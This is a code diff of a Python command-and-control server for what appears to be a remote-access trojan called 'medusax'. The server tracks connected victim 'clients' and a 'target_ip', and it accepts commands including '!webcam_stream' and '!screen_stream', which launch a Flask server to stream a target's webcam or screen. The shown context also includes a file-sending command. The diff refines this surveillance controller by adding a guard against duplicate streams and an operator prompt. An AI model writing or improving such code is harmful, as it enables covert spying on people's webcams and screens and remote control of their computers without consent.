@@ -1,16 +1,15 @@
 import socket
 import threading
-import os
 import time
 import requests
 from flask import Flask, render_template
-import random
 
 # Flask app for streaming webcam/screen
 app = Flask(__name__)
 
 clients = {}  # Store client IPs and status
 target_ip = None
+streaming_active = False
 
 # Start Flask Web Server for Webcam/Screen Streaming
 @app.route('/webcam')
@@ -32,7 +31,7 @@ def start_flask():
 
 # Handle communication with the client
 def client_handler(client_socket, client_ip):
-    global target_ip
+    global target_ip, streaming_active
     print(f"[+] New client connected: {client_ip}")
     clients[client_ip] = "Idle"
     
@@ -64,14 +63,20 @@ def client_handler(client_socket, client_ip):
             print("[+] File sent!")
         
         elif command == "!webcam_stream":
-            if target_ip:
+            if target_ip and not streaming_active:
                 print("[+] Starting Webcam Stream...")
                 threading.Thread(target=start_flask).start()
+                streaming_active = True
+            else:
+                print("[*] Cannot start streaming. Either no target set or streaming is already active.")
 
         elif command == "!screen_stream":
-            if target_ip:
+            if target_ip and not streaming_active:
                 print("[+] Starting Screen Stream...")
                 threading.Thread(target=start_flask).start()
+                streaming_active = True
+            else:
+                print("[*] Cannot start streaming. Either no target set or streaming is already active.")
 
         # If command not recognized
         else:
@@ -90,6 +95,10 @@ def start_server():
         client_socket, client_address = server.accept()
         client_thread = threading.Thread(target=client_handler, args=(client_socket, client_address[0]))
         client_thread.start()
+
+        # Show the prompt after one client is connected
+        if len(clients) == 1:
+            print("medusax > ", end="")
 
 if __name__ == "__main__":
     start_server()
